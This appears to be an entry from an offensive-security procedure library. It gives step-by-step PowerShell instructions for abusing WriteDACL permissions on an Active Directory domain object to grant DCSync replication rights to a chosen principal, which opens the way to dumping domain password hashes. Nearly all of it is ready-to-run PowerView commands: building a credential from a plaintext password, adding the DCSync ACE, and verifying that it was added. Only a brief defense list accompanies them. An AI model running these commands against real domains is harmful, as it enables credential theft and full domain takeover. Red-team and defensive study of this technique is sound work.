---
id: 870ad407-c447-4a42-aa71-d830638e00d7
name: Add-DCSync-Rights-via-WriteDACL-Permissions
type: procedure
verified: true
submitted: true
created_at: '2020-03-16T00:35:46.352047+00:00'
updated_at: '2023-05-25T19:43:13.389277+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credential Dumping]]'
sub_techniques:
  - '[[DCSync]]'
tags:
  - active-directory
commands:
  - '[[commands/create-windows-pscredential-object]]'
  - '[[commands/powerview-add-dcsync-rights]]'
platforms:
  - Windows
tools: []
validated: true
---

# Add-DCSync-Rights-via-WriteDACL-Permissions

## Summary

This procedure abuses WriteDACL permissions on the domain object to add an ACE granting DCSync rights (replication privileges), allowing simulation of a DC to dump hashes without physical access.

## Description

DCSync mimics DC replication via DRSUAPI to extract NTDS.dit. WriteDACL allows modifying security descriptors to delegate these rights (GetChanges, GetChangesAll), a common escalation from BloodHound-identified paths.

## Requirements

- Creds with WriteDACL on domain
- PowerView imported
- Target principal (user/service) to grant rights

## Defense

- Protect domain object DACL
- Monitor replication request anomalies
- Use least privilege for service accounts

## Objectives

1. Create secure credential
2. Add DCSync ACE to domain
3. Verify rights delegation

## Instructions

### Step 1: Import PowerView

**Context**: Load on shell.

No command; .\PowerView.ps1.

### Step 2: Create Credential

**Context**: For the WriteDACL user.

**Command** ([[commands/create-windows-pscredential-object]]):
```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USERNAME", $Pass
```

### Step 3: Delegate DCSync Rights

**Context**: Add ACE for replication.

**Command** ([[commands/powerview-add-dcsync-rights]]):
```powershell
Add-DomainObjectAcl -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity $_TARGET_PRINCIPAL -Credential $Cred
```

> Targets nTDSDSA object implicitly.

### Step 4: Verify

**Context**: Check ACL.

**Command** (Get-DomainObjectAcl):
```powershell
Get-DomainObjectAcl -Identity $_DOMAIN | ? {$_.PrincipalIdentity -eq $_TARGET_PRINCIPAL}
```

**Expected Output**: ACE with DS-Replication rights.

## Expected Output

Added ACL rights successfully.
